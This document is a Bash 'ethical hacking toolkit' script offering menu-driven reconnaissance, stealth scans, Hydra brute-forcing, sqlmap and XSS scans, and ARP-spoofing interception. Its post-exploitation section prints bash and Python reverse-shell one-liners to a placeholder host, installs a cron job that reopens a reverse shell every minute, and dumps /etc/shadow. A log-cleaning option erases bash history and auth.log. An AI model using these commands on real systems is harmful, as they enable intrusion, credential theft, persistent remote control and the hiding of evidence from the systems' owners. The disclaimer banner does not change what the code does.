#!/bin/bash

# ======================
# CONFIGURATION
# ======================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    exit 1
fi

# ======================
# BANNER
# ======================
clear
echo -e "${BLUE}"
cat << "EOF"
   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
  ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌
  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌
  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
  ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌
  ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
   ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 
EOF
echo -e "${NC}"
echo -e "${YELLOW}       Advanced Ethical Hacking Toolkit${NC}"
echo -e "${YELLOW}       -------------------------------${NC}"
echo -e "${RED}WARNING: For authorized testing only. Use responsibly.${NC}"
echo ""

# ======================
# MAIN MENU
# ======================
show_menu() {
    echo -e "${BLUE}[1] Network Reconnaissance"
    echo -e "[2] Port Scanning (Stealth/Advanced)"
    echo -e "[3] Vulnerability Scanning"
    echo -e "[4] Password Attacks"
    echo -e "[5] Web Application Testing"
    echo -e "[6] Man-in-the-Middle (MITM)"
    echo -e "[7] Post-Exploitation"
    echo -e "[8] Clean Logs"
    echo -e "[9] Exit${NC}"
    echo ""
    read -p "Select an option: " choice
}

# ======================
# NETWORK RECON
# ======================
network_recon() {
    echo -e "${YELLOW}[*] Running Network Discovery...${NC}"
    read -p "Enter target IP or subnet (e.g., 192.168.1.0/24): " target
    
    echo -e "${GREEN}[+] Running ARP Scan...${NC}"
    arp-scan --localnet | grep -i -E '([0-9]{1,3}\.){3}[0-9]{1,3}'
    
    echo -e "${GREEN}[+] Running Ping Sweep...${NC}"
    nmap -sn $target | grep "Nmap scan report" | awk '{print $5, $6}'
    
    echo -e "${GREEN}[+] Running OS Detection...${NC}"
    nmap -O $target
}

# ======================
# STEALTH PORT SCANNING
# ======================
port_scan() {
    echo -e "${YELLOW}[*] Starting Port Scanner...${NC}"
    read -p "Enter target IP: " target
    
    echo -e "${GREEN}[1] Quick SYN Scan (Stealth)"
    echo -e "[2] Full Port Scan (TCP)"
    echo -e "[3] UDP Scan (Slow)"
    echo -e "[4] Version Detection${NC}"
    read -p "Select scan type: " scan_type
    
    case $scan_type in
        1) nmap -sS -T4 $target ;;
        2) nmap -p- -T4 $target ;;
        3) nmap -sU -T4 $target ;;
        4) nmap -sV -T4 $target ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

# ======================
# VULNERABILITY SCANNING
# ======================
vuln_scan() {
    echo -e "${YELLOW}[*] Running Vulnerability Scan...${NC}"
    read -p "Enter target IP: " target
    
    echo -e "${GREEN}[+] Checking for common CVEs...${NC}"
    nmap --script vuln $target
    
    echo -e "${GREEN}[+] Checking for misconfigurations...${NC}"
    nikto -h $target
}

# ======================
# PASSWORD ATTACKS
# ======================
password_attack() {
    echo -e "${YELLOW}[*] Password Cracking Module${NC}"
    echo -e "${GREEN}[1] SSH Bruteforce (Hydra)"
    echo -e "[2] FTP Bruteforce"
    echo -e "[3] ZIP Password Crack (John)"
    echo -e "[4] Custom Wordlist Attack${NC}"
    read -p "Select option: " attack_type
    
    case $attack_type in
        1)
            read -p "Enter target IP: " target
            read -p "Enter username: " user
            read -p "Enter wordlist path: " wordlist
            hydra -l $user -P $wordlist ssh://$target -t 4
            ;;
        2)
            read -p "Enter target IP: " target
            read -p "Enter wordlist path: " wordlist
            hydra -L $wordlist -P $wordlist ftp://$target
            ;;
        3)
            read -p "Enter ZIP file: " zipfile
            read -p "Enter wordlist: " wordlist
            john --format=zip $zipfile --wordlist=$wordlist
            ;;
        4)
            read -p "Enter service (ssh/ftp/rdp): " service
            read -p "Enter target IP: " target
            read -p "Enter username: " user
            read -p "Enter wordlist: " wordlist
            hydra -l $user -P $wordlist $service://$target
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac
}

# ======================
# WEB APP TESTING
# ======================
web_app_test() {
    echo -e "${YELLOW}[*] Web Application Scanner${NC}"
    read -p "Enter target URL (e.g., http://example.com): " url
    
    echo -e "${GREEN}[+] Running Nikto Scan...${NC}"
    nikto -h $url
    
    echo -e "${GREEN}[+] Checking for SQL Injection...${NC}"
    sqlmap -u "$url" --batch --crawl=2
    
    echo -e "${GREEN}[+] Checking for XSS...${NC}"
    xsstrike -u "$url"
}

# ======================
# MITM (ARP Spoofing)
# ======================
mitm_attack() {
    echo -e "${YELLOW}[*] Man-in-the-Middle Attack${NC}"
    echo -e "${RED}WARNING: This will intercept traffic. Use only in lab environments.${NC}"
    read -p "Enter target IP: " target
    read -p "Enter gateway IP: " gateway
    
    echo -e "${GREEN}[+] Enabling IP forwarding...${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    echo -e "${GREEN}[+] Starting ARP spoofing...${NC}"
    arpspoof -i eth0 -t $target $gateway &
    arpspoof -i eth0 -t $gateway $target &
    
    echo -e "${GREEN}[+] Capturing traffic (Ctrl+C to stop)...${NC}"
    tcpdump -i eth0 -w captured.pcap
    
    echo -e "${GREEN}[+] Stopping MITM...${NC}"
    pkill arpspoof
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

# ======================
# POST-EXPLOITATION
# ======================
post_exploit() {
    echo -e "${YELLOW}[*] Post-Exploitation Toolkit${NC}"
    echo -e "${GREEN}[1] Generate Reverse Shell"
    echo -e "[2] Add Persistence (Cronjob)"
    echo -e "[3] Dump Password Hashes${NC}"
    read -p "Select option: " post_option
    
    case $post_option in
        1)
            echo -e "${GREEN}[+] Generating reverse shell commands...${NC}"
            echo "Bash: bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"
            echo "Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        2)
            echo -e "${GREEN}[+] Adding persistence via crontab...${NC}"
            (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'") | crontab -
            ;;
        3)
            echo -e "${GREEN}[+] Dumping hashes (requires root)...${NC}"
            cat /etc/shadow
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac
}

# ======================
# CLEAN LOGS
# ======================
clean_logs() {
    echo -e "${YELLOW}[*] Cleaning Logs...${NC}"
    echo -e "${RED}WARNING: This will delete logs. Use carefully.${NC}"
    
    echo -e "${GREEN}[+] Clearing bash history...${NC}"
    history -c
    rm ~/.bash_history
    
    echo -e "${GREEN}[+] Clearing auth logs...${NC}"
    echo "" > /var/log/auth.log
    
    echo -e "${GREEN}[+] Done. Logs cleaned.${NC}"
}

# ======================
# MAIN LOOP
# ======================
while true; do
    show_menu
    case $choice in
        1) network_recon ;;
        2) port_scan ;;
        3) vuln_scan ;;
        4) password_attack ;;
        5) web_app_test ;;
        6) mitm_attack ;;
        7) post_exploit ;;
        8) clean_logs ;;
        9) echo -e "${GREEN}[+] Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
    echo ""
    read -p "Press [Enter] to continue..."
done